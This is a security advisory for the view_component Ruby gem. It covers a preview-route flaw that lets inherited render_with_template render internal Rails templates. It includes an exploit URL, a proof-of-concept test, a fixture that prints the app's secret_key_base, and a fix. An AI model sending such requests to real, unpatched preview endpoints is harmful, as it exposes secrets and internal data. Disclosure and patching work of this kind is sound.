# [M] view_component: Preview Route Can Dispatch Inherited Helper Methods

## Summary
Severity: Medium
Advisory: GHSA-7f3r-gwc9-2995
CVE: CVE-2026-44836
CWE: CWE-277, CWE-749
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-7f3r-gwc9-2995
Type: github-advisory

## Affected
- RubyGems: `view_component` — affected >=3.0.0 <4.9.0

## Details
### Summary

The preview route derives an example name from the URL and calls it with `public_send`. The code does not verify that the requested method is one of the preview examples explicitly defined by the preview class.

As a result, inherited public methods on `ViewComponent::Preview` are route-reachable. The most important one is `render_with_template`, which accepts `template:` and `locals:`. Those values can come from request params and are later passed to Rails as `render template:`.

If previews are exposed, an attacker can render internal Rails templates that are not otherwise routable.

Severity: High if preview routes are externally reachable; Medium otherwise.

Affected files:

- `lib/view_component/preview.rb`
- `app/controllers/concerns/view_component/preview_actions.rb`
- `app/views/view_components/preview.html.erb`


### Relevant Code

`app/controllers/concerns/view_component/preview_actions.rb`:

```ruby
@example_name = File.basename(params[:path])
@render_args = @preview.render_args(@example_name, params: params.permit!)
```

`lib/view_component/preview.rb`:

```ruby
example_params_names = instance_method(example).parameters.map(&:last)
provided_params = params.slice(*example_params_names).to_h.symbolize_keys
result = provided_params.empty? ? new.public_send(example) : new.public_send(example, **provided_params)
```

`app/views/view_components/preview.html.erb`:

```erb
<%= render template: @render_args[:template], locals: @render_args[:locals] || {} %>
```

The UI only lists direct preview methods via:

```ruby
public_instance_methods(false).map(&:to_s).sort
```

But `render_args` does not enforce that list before dispatching.

### Exploit Flow

Example request:

```text
GET /rails/view_components/my_component/render_with_template?template=internal/secret&locals[poc_local]=attacker-controlled-local&request_marker=attacker-controlled-request
```

Flow:

1. `my_component` resolves to a valid preview.
2. `File.basename(params[:path])` returns `render_with_template`.
3. `render_args` calls inherited `ViewComponent::Preview#render_with_template`.
4. Request params provide `template: "internal/secret"` and `locals: {...}`.
5. The preview view renders `internal/secret` with attacker-controlled locals.

Impact depends on what internal templates render. In the worst case this can expose secrets, config, debug data, admin-only partials, or request/session-derived values.

### PoC Test

This checkout already contains a PoC at:

- `test/sandbox/test/security_preview_template_poc_test.rb`
- `test/sandbox/app/views/internal/secret.html.erb`

The test proves that `/internal/secret` is not directly routable, but can still be rendered through the preview endpoint by invoking inherited `render_with_template`.

If reproducing manually, run:

```bash
bundle exec ruby -Itest test/sandbox/test/security_preview_template_poc_test.rb
```

Equivalent standalone test:

```ruby
# frozen_string_literal: true

require "test_helper"

class SecurityPreviewTemplatePocTest < ActionDispatch::IntegrationTest
  def setup
    ViewComponent::Preview.__vc_load_previews
  end

  def test_preview_route_can_invoke_inherited_render_with_template
    refute_includes MyComponentPreview.examples, "render_with_template"

    assert_raises(ActionController::RoutingError) do
      Rails.application.routes.recognize_path("/internal/secret")
    end

    get(
      "/rails/view_components/my_component/render_with_template",
      params: {
        template: "internal/secret",
        locals: {poc_local: "attacker-controlled-local"},
        request_marker: "attacker-controlled-request"
      }
    )

    assert_response :success
    assert_includes response.body, "VC_PREVIEW_POC_SECRET=foo"
    assert_includes response.body, "VC_PREVIEW_POC_LOCAL=attacker-controlled-local"
    assert_includes response.body, "VC_PREVIEW_POC_REQUEST=attacker-controlled-request"
  end
end
```

Fixture template:

```erb
<div id="poc-secret">VC_PREVIEW_POC_SECRET=<%= Rails.application.secret_key_base %></div>
<div id="poc-local">VC_PREVIEW_POC_LOCAL=<%= local_assigns[:poc_local] || local_assigns["poc_local"] %></div>
<div id="poc-request">VC_PREVIEW_POC_REQUEST=<%= params[:request_marker] %></div>
```

### Suggested Fix

Only dispatch explicitly declared preview examples:

```ruby
def render_args(example, params: {})
  example = example.to_s
  raise AbstractController::ActionNotFound unless examples.include?(example)

  example_params_names = instance_method(example).parameters.map(&:last)
  provided_params = params.slice(*example_params_names).to_h.symbolize_keys
  result = provided_params.empty? ? new.public_send(example) : new.public_send(example, **provided_params)
  result ||= {}
  result[:template] = preview_example_template_path(example) if result[:template].nil?
  @layout = nil unless defined?(@layout)
  result.merge(layout: @layout)
end
```

Add a regression test that `/rails/view_components/my_component/render_with_template` fails unless `render_with_template` is explicitly defined as a preview example on that class.

## References
- https://github.com/ViewComponent/view_component/security/advisories/GHSA-7f3r-gwc9-2995
- https://nvd.nist.gov/vuln/detail/CVE-2026-44836
- https://github.com/ViewComponent/view_component
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/view_component/CVE-2026-44836.yml
